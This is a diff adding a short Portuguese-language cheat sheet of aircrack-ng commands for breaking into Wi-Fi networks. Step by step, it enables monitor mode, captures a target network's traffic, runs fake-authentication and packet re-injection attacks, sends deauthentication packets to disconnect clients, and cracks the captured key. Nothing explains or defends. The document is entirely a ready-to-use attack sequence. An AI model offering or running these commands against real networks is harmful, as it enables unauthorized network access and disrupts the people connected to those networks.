@@ -1,0 +1,33 @@
+Linha de comando:
+
+Mostrando dispositivos de rede:
+
+# ifconfig
+
+Ativando interface de monitoramento:
+
+# airmon-ng start wlan0
+
+Monitorando o ar:
+
+# airodump-ng wlan0mon
+
+Filtrando monitoramento e gravando em arquivo
+
+# airodump-ng wlan0mon -c <canal> --bssid <bssid da rede> -w <arquivo>
+
+Ataque de falsa autenticação
+
+# aireplay-ng -1 0 -e <essid> wlan0mon
+
+Interceptando e re-injetando pacotes
+
+# aireplay-ng -3 -b <bssid> wlan0mon
+
+Ataque de desautenticação
+
+# aireplay-ng -0 3 -a <bssid> wlan0mon
+
+Quebrando a senha
+
+# aircrack-ng <arquivo>.cap
